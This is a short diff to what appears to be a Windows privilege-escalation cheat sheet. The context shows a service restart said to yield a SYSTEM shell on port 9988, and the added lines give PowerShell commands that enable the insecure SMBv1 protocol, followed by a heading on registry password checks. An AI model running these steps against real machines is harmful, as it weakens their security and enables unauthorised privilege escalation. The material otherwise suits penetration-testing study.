@@ -104,7 +104,12 @@ net stop upnphost
 net start upnphost
 
 # listen on port 9988 and you'll get a shell with NT AUTHORITY\SYSTEM privileges
+--------------------------------------
 
+# This is to enable SMBv1 on windows pc
+
+Get-WindowsOptionalFeature –Online –FeatureName SMB1Protocol # runs powershell as local admin
+Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
 --------------------------------------
 
 Registry Checks for Passwords
